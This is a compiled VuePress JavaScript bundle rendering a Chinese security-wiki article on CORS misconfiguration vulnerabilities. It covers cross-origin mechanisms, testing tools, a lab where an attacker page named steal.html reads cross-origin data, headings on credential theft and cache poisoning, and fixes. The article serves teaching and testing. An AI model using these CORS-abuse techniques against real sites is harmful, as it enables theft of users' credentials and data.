noreferrer"},Ln={href:"https://zhuanlan.zhihu.com/p/83099266",target:"_blank",rel:"noopener noreferrer"},Fn={href:"https://www.cnblogs.com/wenyoudo/p/14862701.html",target:"_blank",rel:"noopener noreferrer"},Hn={href:"https://blog.csdn.net/BHSZZY/article/details/119024992",target:"_blank",rel:"noopener noreferrer"},jn={href:"https://www.cnblogs.com/gorillalee/p/14561896.html",target:"_blank",rel:"noopener noreferrer"},Pn={href:"https://github.com/aszx87410/blog/issues/68",target:"_blank",rel:"noopener noreferrer"},_n={href:"https://blog.csdn.net/qq_38011415/article/details/107095403#:~:text=Nginx%E8%B7%A8%E5%9F%9F%E9%85%8D%E7%BD%AE%201%201.%E4%BB%80%E4%B9%88%E6%98%AF%E8%B7%A8%E5%9F%9F%20%E7%94%B1%E4%BA%8E%E6%B5%8F%E8%A7%88%E5%99%A8%E7%9A%84%E5%90%8C%E6%BA%90%E7%AD%96%E7%95%A5%EF%BC%8C%E7%94%A8%E6%9D%A5%E9%99%90%E5%88%B6%E4%BB%8E%E4%B8%80%E4%B8%AA%E6%BA%90%E5%8A%A0%E8%BD%BD%E7%9A%84%E6%96%87%E6%A1%A3%E6%88%96%E8%84%9A%E6%9C%AC%E4%B8%8E%E6%9D%A5%E8%87%AA%E5%8F%A6%E4%B8%80%E4%B8%AA%E6%BA%90%E7%9A%84%E8%B5%84%E6%BA%90%E8%BF%9B%E8%A1%8C%E4%BA%A4%E4%BA%92%E3%80%82%20%E9%82%A3%E6%80%8E%E6%A0%B7%E5%88%A4%E6%96%AD%E6%98%AF%E5%90%A6%E6%98%AF%E5%90%8C%E6%BA%90%E5%91%A2%EF%BC%9F%20%E5%A6%82%E6%9E%9C%E5%8D%8F%E8%AE%AE%EF%BC%8C%E7%AB%AF%E5%8F%A3%EF%BC%88%E5%A6%82%E6%9E%9C%E6%8C%87%E5%AE%9A%E4%BA%86%EF%BC%89%E5%92%8C%E4%B8%BB%E6%9C%BA%E5%AF%B9%E4%BA%8E%E4%B8%A4%E4%B8%AA%E9%A1%B5%E9%9D%A2%E6%98%AF%E7%9B%B8%E5%90%8C%E7%9A%84%EF%BC%8C%E5%88%99%E4%B8%A4%E4%B8%AA%E9%A1%B5%E9%9D%A2%E5%85%B7%E6%9C%89%E7%9B%B8%E5%90%8C%E7%9A%84%E6%BA%90%EF%BC%8C%E4%B9%9F%E5%B0%B1%E6%98%AF%E5%90%8C%E6%BA%90%E3%80%82%20...%202,%3B%20%E9%80%9A%E8%BF%87%E5%8F%8D%E5%90%91%E4%BB%A3%E7%90%86%20%3B%20...%205%205.%E9%99%84%E5%BD%95%205.1%E7%A4%BA%E4%BE%8B%E4%B8%ADNginx%E5%AE%8C%E6%95%B4%E9%85%8D%E7%BD%AE%20",target:"_blank",rel:"noopener noreferrer"},Wn={href:"https://developer.mozilla.org/en-US/docs/Web/API/XMLHttpRequest/withCredentials",target:"_blank",rel:"noopener noreferrer"},Dn=(0,e.Lk)("p",null,"‍",-1),Mn={},Xn=(0,a(7708).A)(Mn,[["render",function(n,s){const a=(0,e.g2)("ExternalLinkIcon"),t=(0,e.g2)("RouteLink");return(0,e.uX)(),(0,e.CE)("div",null,[q,O,(0,e.Lk)("p",null,[(0,e.eW)("CORS，跨域资源共享（"),(0,e.Lk)("a",S,[(0,e.eW)("Cross-Origin Resource Sharing"),(0,e.bF)(a)]),(0,e.eW)("），是 H5 提供的一种机制，WEB 应用程序可以通过在 HTTP 增加字段来告诉浏览器，哪些不同来源的服务器是有权访问本站资源的，当不同域的请求发生时，就出现了跨域的现象。当该配置不当的时候，就导致资源被恶意操作。")]),R,(0,e.Lk)("blockquote",null,[(0,e.Lk)("p",null,[(0,e.Lk)("a",T,[(0,e.eW)("「你的 Request 還是有發出去的」，而且瀏覽器也「確實有收到 Response」，重點是「瀏覽器因為同源政策，不把結果傳回給你的 JavaScript」。如果沒有瀏覽器的話其實就沒有這些問題，你愛發給誰就發給誰，不管怎樣都拿得到 Response。"),(0,e.bF)(a)])]),B]),L,(0,e.Lk)("blockquote",null,[(0,e.Lk)("p",null,[(0,e.eW)("https://xz.aliyun.com/t/6614 "),(0,e.Lk)("a",F,[(0,e.eW)("https://www.bedefended.com/papers/cors-security-guide"),(0,e.bF)(a)])])]),H,(0,e.Lk)("p",null,[j,(0,e.eW)(" 等带 "),P,(0,e.eW)(" 属性的标签都可以跨域加载资源，而不受同源策略的限制。 每次加载时都会由浏览器发送一次 GET 请求，通过 "),_,(0,e.eW)(" 属性加载的资源，浏览器会限（"),(0,e.bF)(t,{to:"/websec/%E5%AE%89%E5%85%A8%E6%BC%8F%E6%B4%9E/CORS%E8%B7%A8%E5%9F%9F%E6%BC%8F%E6%B4%9E.html#0x03%20CORS%20%E8%AF%A6%E8%A7%A3"},{default:(0,e.k6)((()=>[(0,e.eW)("0x03 CORS 详解")])),_:1}),(0,e.eW)(" ）JavaScript 的权限，使其不能读写返回的内容。")]),W,(0,e.Lk)("p",null,[D,(0,e.eW)("："),(0,e.Lk)("a",M,[(0,e.eW)("https://www.cnblogs.com/rainman/archive/2011/02/20/1959325.html#m4"),(0,e.bF)(a)]),(0,e.eW)(" a.html 欲与 b.html 跨域相互通信，通过中间页 c.html 来实现。 三个页面，不同域之间利用 iframe 的 location.hash 传值，相同域之间直接 js 访问来通信。")]),X,z,I,(0,e.Lk)("p",null,[(0,e.eW)("flash 有自己的一套安全策略，服务器可以通过 crossdomain.xml 文件来声明能被哪些域的 SWF 文件访问，SWF 也可以通过 API 来确定自身能被哪些域的 SWF 加载。 具体见："),(0,e.Lk)("a",N,[(0,e.eW)("https://www.adobe.com/devnet/articles/crossdomain_policy_file_spec.html"),(0,e.bF)(a)])]),U,(0,e.Lk)("ol",G,[(0,e.Lk)("li",null,[(0,e.eW)("通过 "),J,(0,e.eW)(" 请求 "),(0,e.Lk)("a",$,[(0,e.eW)("http://test.com/json?callback=handleResponse，"),(0,e.bF)(a)])]),V,K]),Y,Z,Q,(0,e.Lk)("p",null,[(0,e.eW)("它允许浏览器向跨源服务器，发出 "),(0,e.Lk)("a",nn,[(0,e.eW)("XMLHttpRequest"),(0,e.bF)(a)]),(0,e.eW)("​​​ ​请求，从而克服了 AJAX 只能"),(0,e.Lk)("a",sn,[(0,e.eW)("同源"),(0,e.bF)(a)]),(0,e.eW)("使用的限制")]),an,(0,e.Lk)("p",null,[(0,e.eW)("只要同时满足以下两大条件，就属于"),(0,e.Lk)("a",en,[(0,e.eW)("简单请求"),(0,e.bF)(a)]),(0,e.eW)("。")]),tn,(0,e.Lk)("p",null,[(0,e.Lk)("a",pn,[(0,e.eW)("为什么需要预请求？"),(0,e.bF)(a)])]),on,(0,e.Lk)("ul",null,[(0,e.Lk)("li",null,[(0,e.Lk)("a",ln,[(0,e.eW)("GitHub - chenjj/CORScanner: 🎯 Fast CORS misconfiguration vulnerabilities scanner"),(0,e.bF)(a)])])]),cn,(0,e.Lk)("p",null,[(0,e.eW)("访问 "),(0,e.Lk)("a",rn,[(0,e.eW)("mob.exp:8081/manager/steal.html"),(0,e.bF)(a)]),(0,e.eW)("，可以看到返回内容写入 secrect.html 中。")]),un,(0,e.Lk)("p",null,[(0,e.eW)("接着在 hacker 端 mob.exp 构造 steal.html，这里我们假设是 "),(0,e.Lk)("a",dn,[(0,e.eW)("http://mob.exp:8081/manager/steal.html"),(0,e.bF)(a)])]),kn,(0,e.Lk)("p",null,[(0,e.eW)("再次访问 "),(0,e.Lk)("a",vn,[(0,e.eW)("mob.exp:8081/manager/steal.html"),(0,e.bF)(a)]),(0,e.eW)(" 发现可以正常 alert 了，成功实现了跨域资源的请求。")]),mn,(0,e.Lk)("p",null,[(0,e.eW)("搜狐视频 CORS 误配置漏洞演示："),(0,e.Lk)("a",gn,[(0,e.eW)("https://www.youtube.com/watch?v=PWbPbtyyNi8"),(0,e.bF)(a)])]),hn,(0,e.Lk)("ul",null,[bn,(0,e.Lk)("li",null,[(0,e.eW)("nginx 解决复杂请求跨域的时候需加上 aways 参数 eg："),wn,(0,e.eW)(' 原因：As of Nginx 1.7.5, add_header supports an "always" parameter which ​allows CORS to work if the backend returns 4xx or 5xx status code.​​ 参考资料：'),(0,e.Lk)("a",fn,[(0,e.eW)("https://gist.github.com/Stanback/7145487"),(0,e.bF)(a)])])]),xn,(0,e.Lk)("ul",null,[(0,e.Lk)("li",null,[(0,e.Lk)("a",An,[(0,e.eW)("组合漏洞导致的账号劫持 - 先知社区 (aliyun.com)"),(0,e.bF)(a)])]),(0,e.Lk)("li",null,[(0,e.Lk)("a",Cn,[(0,e.eW)("https://www.someattack.com/Playground/About"),(0,e.bF)(a)])]),(0,e.Lk)("li",null,[(0,e.Lk)("a",En,[(0,e.eW)("鸡肋 CSRF 和 Self-XSS 组合的变废为宝 - FreeBuf 网络安全行业门户"),(0,e.bF)(a)])])]),yn,(0,e.Lk)("ul",null,[(0,e.Lk)("li",null,[(0,e.Lk)("a",qn,[(0,e.eW)("跨域资源共享 CORS 详解 - 阮一峰的网络日志 (ruanyifeng.com)"),(0,e.bF)(a)]),(0,e.eW)(" -- 可以顺便看看评论")]),(0,e.Lk)("li",null,[(0,e.Lk)("a",On,[(0,e.eW)("绕过浏览器 SOP，跨站窃取信息：CORS 配置安全漏洞报告及最佳部署实践 | Jianjun Chen | International Computer Science Institute | Network Security"),(0,e.bF)(a)]),(0,e.eW)(" -- 推荐阅读")]),(0,e.Lk)("li",null,[(0,e.Lk)("a",Sn,[(0,e.eW)("https://web.dev/cross-origin-resource-sharing/"),(0,e.bF)(a)])]),(0,e.Lk)("li",null,[(0,e.Lk)("a",Rn,[(0,e.eW)("https://developer.mozilla.org/en-US/docs/Web/HTTP/CORS"),(0,e.bF)(a)])]),(0,e.Lk)("li",null,[(0,e.eW)("CVE-2018-8014，"),(0,e.Lk)("a",Tn,[(0,e.eW)("https://nvd.nist.gov/vuln/detail/CVE-2018-8014"),(0,e.bF)(a)])]),(0,e.Lk)("li",null,[(0,e.Lk)("a",Bn,[(0,e.eW)("nginx - 前端常见跨域解决方案（全） - 个人文章 - SegmentFault 思否"),(0,e.bF)(a)])]),(0,e.Lk)("li",null,[(0,e.Lk)("a",Ln,[(0,e.eW)("CORS 介绍及其漏洞检测 - 知乎 (zhihu.com)"),(0,e.bF)(a)])]),(0,e.Lk)("li",null,[(0,e.Lk)("a",Fn,[(0,e.eW)("CORS 跨域漏洞修复 - 不愿透露姓名的汤姆猫 - 博客园 (cnblogs.com)"),(0,e.bF)(a)])]),(0,e.Lk)("li",null,[(0,e.Lk)("a",Hn,[(0,e.eW)("(82 条消息) CORS(跨域资源共享)漏洞解决方法_cors 漏洞修复_追逐梦想永不停的博客-CSDN 博客"),(0,e.bF)(a)]),(0,e.eW)(" -- 测试方法说明有误")]),(0,e.Lk)("li",null,[(0,e.Lk)("a",jn,[(0,e.eW)("【漏洞利用】跨域资源共享（CORS）漏洞详解 - GorillaLee - 博客园 (cnblogs.com)"),(0,e.bF)(a)])]),(0,e.Lk)("li",null,[(0,e.Lk)("a",Pn,[(0,e.eW)("CORS 完全手冊（一）：為什麼會發生 CORS 錯誤？ · Issue #68 · aszx87410/blog · GitHub"),(0,e.bF)(a)])]),(0,e.Lk)("li",null,[(0,e.Lk)("a",_n,[(0,e.eW)("(82 条消息) Nginx 跨域配置_程序员小强的博客-CSDN 博客"),(0,e.bF)(a)])]),(0,e.Lk)("li",null,[(0,e.Lk)("a",Wn,[(0,e.eW)("https://developer.mozilla.org/en-US/docs/Web/API/XMLHttpRequest/withCredentials"),(0,e.bF)(a)])])]),Dn])}]]),zn=JSON.parse('{"path":"/websec/%E5%AE%89%E5%85%A8%E6%BC%8F%E6%B4%9E/CORS%20%E8%B7%A8%E5%9F%9F%E6%BC%8F%E6%B4%9E.html","title":"CORS 跨域漏洞","lang":"zh-CN","frontmatter":{"title":"CORS 跨域漏洞","description":"0x01 漏洞描述 概述 CORS，跨域资源共享（Cross-Origin Resource Sharing），是 H5 提供的一种机制，WEB 应用程序可以通过在 HTTP 增加字段来告诉浏览器，哪些不同来源的服务器是有权访问本站资源的，当不同域的请求发生时，就出现了跨域的现象。当该配置不当的时候，就导致资源被恶意操作。 当 CORS 的设置不正确时...","head":[["meta",{"property":"og:url","content":"https://github.com/zha0cai/SecWikiPublic/secwiki/websec/%E5%AE%89%E5%85%A8%E6%BC%8F%E6%B4%9E/CORS%20%E8%B7%A8%E5%9F%9F%E6%BC%8F%E6%B4%9E.html"}],["meta",{"property":"og:site_name","content":"One-Piece"}],["meta",{"property":"og:title","content":"CORS 跨域漏洞"}],["meta",{"property":"og:description","content":"0x01 漏洞描述 概述 CORS，跨域资源共享（Cross-Origin Resource Sharing），是 H5 提供的一种机制，WEB 应用程序可以通过在 HTTP 增加字段来告诉浏览器，哪些不同来源的服务器是有权访问本站资源的，当不同域的请求发生时，就出现了跨域的现象。当该配置不当的时候，就导致资源被恶意操作。 当 CORS 的设置不正确时..."}],["meta",{"property":"og:type","content":"article"}],["meta",{"property":"og:locale","content":"zh-CN"}],["meta",{"property":"og:updated_time","content":"2024-04-03T09:07:08.000Z"}],["meta",{"property":"article:author","content":"Mr.zha0cai"}],["meta",{"property":"article:modified_time","content":"2024-04-03T09:07:08.000Z"}],["script",{"type":"application/ld+json"},"{\\"@context\\":\\"https://schema.org\\",\\"@type\\":\\"Article\\",\\"headline\\":\\"CORS 跨域漏洞\\",\\"image\\":[\\"\\"],\\"dateModified\\":\\"2024-04-03T09:07:08.000Z\\",\\"author\\":[{\\"@type\\":\\"Person\\",\\"name\\":\\"Mr.zha0cai\\",\\"url\\":\\"https://github.com/zha0cai\\"}]}"]]},"headers":[{"level":2,"title":"概述","slug":"概述","link":"#概述","children":[]},{"level":2,"title":"测试方法","slug":"测试方法","link":"#测试方法","children":[]},{"level":2,"title":"什么是同源 & 跨域","slug":"什么是同源-跨域","link":"#什么是同源-跨域","children":[]},{"level":2,"title":"一些应用场景","slug":"一些应用场景","link":"#一些应用场景","children":[]},{"level":2,"title":"跨域的方法","slug":"跨域的方法","link":"#跨域的方法","children":[{"level":3,"title":"HTML  标签","slug":"html-标签","link":"#html-标签","children":[]},{"level":3,"title":"document.domain","slug":"document-domain","link":"#document-domain","children":[]},{"level":3,"title":"window.name","slug":"window-name","link":"#window-name","children":[]},{"level":3,"title":"window.postMessage","slug":"window-postmessage","link":"#window-postmessage","children":[]},{"level":3,"title":"location.hash","slug":"location-hash","link":"#location-hash","children":[]},{"level":3,"title":"flash","slug":"flash","link":"#flash","children":[]},{"level":3,"title":"JSON & CORS","slug":"json-cors","link":"#json-cors","children":[]}]},{"level":2,"title":"CORS 工作流程（针对浏览器的）","slug":"cors-工作流程-针对浏览器的","link":"#cors-工作流程-针对浏览器的","children":[]},{"level":2,"title":"简单请求","slug":"简单请求","link":"#简单请求","children":[{"level":3,"title":"基本流程","slug":"基本流程","link":"#基本流程","children":[]},{"level":3,"title":"withCredentials 属性","slug":"withcredentials-属性","link":"#withcredentials-属性","children":[]}]},{"level":2,"title":"非简单请求","slug":"非简单请求","link":"#非简单请求","children":[{"level":3,"title":"预检请求","slug":"预检请求","link":"#预检请求","children":[]},{"level":3,"title":"预检请求的回应","slug":"预检请求的回应","link":"#预检请求的回应","children":[]},{"level":3,"title":"浏览器的正常请求和回应","slug":"浏览器的正常请求和回应","link":"#浏览器的正常请求和回应","children":[]}]},{"level":2,"title":"反射 Origin 头","slug":"反射-origin-头","link":"#反射-origin-头","children":[]},{"level":2,"title":"Origin 校验错误","slug":"origin-校验错误","link":"#origin-校验错误","children":[]},{"level":2,"title":"信任 null","slug":"信任-null","link":"#信任-null","children":[]},{"level":2,"title":"HTTPS 域信任 HTTP 域","slug":"https-域信任-http-域","link":"#https-域信任-http-域","children":[]},{"level":2,"title":"信任自身全部子域","slug":"信任自身全部子域","link":"#信任自身全部子域","children":[]},{"level":2,"title":"​Origin:*​​​ 与 Credentials:true​​​ 共用","slug":"​origin-​​​-与-credentials-true​​​-共用","link":"#​origin-​​​-与-credentials-true​​​-共用","children":[]},{"level":2,"title":"缺少 Vary:Origin​​​ 头","slug":"缺少-vary-origin​​​-头","link":"#缺少-vary-origin​​​-头","children":[]},{"level":2,"title":"方法一：检测工具","slug":"方法一-检测工具","link":"#方法一-检测工具","children":[{"level":3,"title":"EXP & POC","slug":"exp-poc","link":"#exp-poc","children":[]},{"level":3,"title":"绕过 http_only 获取 cookie","slug":"绕过-http-only-获取-cookie","link":"#绕过-http-only-获取-cookie","children":[]}]},{"level":2,"title":"方法二：利用 Burpsuit","slug":"方法二-利用-burpsuit","link":"#方法二-利用-burpsuit","children":[]},{"level":2,"title":"方法三：curl 命令","slug":"方法三-curl-命令","link":"#方法三-curl-命令","children":[]},{"level":2,"title":"方法四：浏览器测试","slug":"方法四-浏览器测试","link":"#方法四-浏览器测试","children":[]},{"level":2,"title":"实验测试","slug":"实验测试","link":"#实验测试","children":[]},{"level":2,"title":"获取用户凭证","slug":"获取用户凭证","link":"#获取用户凭证","children":[]},{"level":2,"title":"绕过基于 IP 的认证","slug":"绕过基于-ip-的认证","link":"#绕过基于-ip-的认证","children":[]},{"level":2,"title":"客户端缓存中毒","slug":"客户端缓存中毒","link":"#客户端缓存中毒","children":[]},{"level":2,"title":"服务器端缓存中毒","slug":"服务器端缓存中毒","link":"#服务器端缓存中毒","children":[]},{"level":2,"title":"配合 XSS 劫持会话","slug":"配合-xss-劫持会话","link":"#配合-xss-劫持会话","children":[]},{"level":2,"title":"CORS 与 CSRF 的区别","slug":"cors-与-csrf-的区别","link":"#cors-与-csrf-的区别","children":[]},{"level":2,"title":"方法一：使用通配符 *​​","slug":"方法一-使用通配符-​​","link":"#方法一-使用通配符-​​","children":[]},{"level":2,"title":"方法二：指定域名白名单","slug":"方法二-指定域名白名单","link":"#方法二-指定域名白名单","children":[]},{"level":2,"title":"方法三：使用正则表达式","slug":"方法三-使用正则表达式","link":"#方法三-使用正则表达式","children":[]}],"git":{"createdTime":1711706004000,"updatedTime":1712135228000,"contributors":[{"name":"zha0cai","email":"111300972+zha0cai@users.noreply.github.com","commits":1}]},"readingTime":{"minutes":35.74,"words":10722},"filePathRelative":"websec/安全漏洞/CORS 跨域漏洞.md","localizedDate":"2024年3月29日","autoDesc":true}')}}]);